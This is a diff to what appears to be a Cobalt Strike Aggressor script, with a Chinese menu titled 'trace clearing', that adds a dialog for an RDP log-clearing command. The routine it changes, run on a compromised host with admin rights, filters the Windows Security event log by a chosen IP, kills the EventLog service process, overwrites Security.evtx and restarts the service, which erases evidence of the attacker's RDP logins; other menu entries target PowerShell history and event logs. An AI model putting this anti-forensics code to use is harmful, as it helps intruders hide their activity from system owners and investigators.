@@ -1,13 +1,13 @@
 sub rdpclear {
-	foreach $bid ($1){
-		if (-isadmin $bid){
-			bshell($bid, "tasklist /svc | findstr \"eventlog\"")
-			bpowerpick($bid, "wevtutil epl Security C:\\Windows\\System32\\winevt\\Logs\\Security_new.evtx /q:\"*[EventData[(Data[@Name='IpAddress']='192.168.93.140')]]\" /ow:true;write-host \"[*] Dump IPAddress:127.0.0.1 New evtx\";\$envetlogpid=Get-WmiObject -Class win32_service -Filter \"name = 'eventlog'\" | select -exp ProcessId;write-host \"[*] Kill EventLog Process\";taskkill /F /PID \$envetlogpid;write-host \"[*] Move New Security Evtx ->\";Move-Item C:\\Windows\\System32\\winevt\\Logs\\Security_new.evtx C:\\Windows\\System32\\winevt\\Logs\\Security.evtx -force;write-host \"[*] Run Eventlog Service\";net start eventlog");
-			
-		}else{
-			berror($bid, "非管理员权限")
-		}
+	$bid = $3['bid'];
+	if (-isadmin $bid){
+		bshell($bid, "tasklist /svc | findstr \"eventlog\"")
+		bpowerpick($bid, "wevtutil epl Security C:\\Windows\\System32\\winevt\\Logs\\Security_new.evtx /q:\"*[EventData[(Data[@Name='IpAddress']='$3['selfip']')]]\" /ow:true;write-host \"[*] Dump IPAddress:127.0.0.1 New evtx\";\$envetlogpid=Get-WmiObject -Class win32_service -Filter \"name = 'eventlog'\" | select -exp ProcessId;write-host \"[*] Kill EventLog Process\";taskkill /F /PID \$envetlogpid;write-host \"[*] Move New Security Evtx ->\";Move-Item C:\\Windows\\System32\\winevt\\Logs\\Security_new.evtx C:\\Windows\\System32\\winevt\\Logs\\Security.evtx -force;write-host \"[*] Run Eventlog Service\";net start eventlog");
+		
+	}else{
+		berror($bid, "非管理员权限")
 	}
+	
 }
 
 sub powershellhistory{
@@ -43,7 +43,11 @@ sub eventlogclear{
 menu "&痕迹清除"{
 	item "&RDP登录日志清除" {
 		$bid = $1;
-		rdpclear($bid);
+		$dialog = dialog("RDP History Clear", %(selfip => "192.168.1.1", bid => $id), &rdpclear);
+		dialog_description($dialog, "用于清除RDP登录日志");
+		drow_text($dialog, "selfip", "ip:");
+		dbutton_action($dialog, "run");
+		dialog_show($dialog);
 	}
 	
 	item "&powershell执行命令历史清除"{
